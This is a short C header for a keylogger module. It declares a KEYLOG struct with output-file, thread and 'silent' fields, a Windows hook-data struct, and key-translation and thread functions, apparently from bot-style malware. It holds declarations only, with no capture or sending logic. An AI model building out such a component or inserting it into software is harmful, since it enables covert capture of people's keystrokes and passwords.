#pragma once
#include "define.h"
#include "includes.h"

typedef struct KEYLOG
{
	FILE * outputfile_stream;
	int threadnum;
	bool notice;
	bool silent;
	bool state;

} KEYLOG;


typedef struct _MYHOOKDATA
{
	int nType;
	HOOKPROC hkprc;
	HHOOK hhook;
} MYHOOKDATA;

#ifdef HOOK_KEYLOGGER
char* translate(int vk, bool up);
#endif

DWORD WINAPI WinAPIextentionK(LPVOID param);

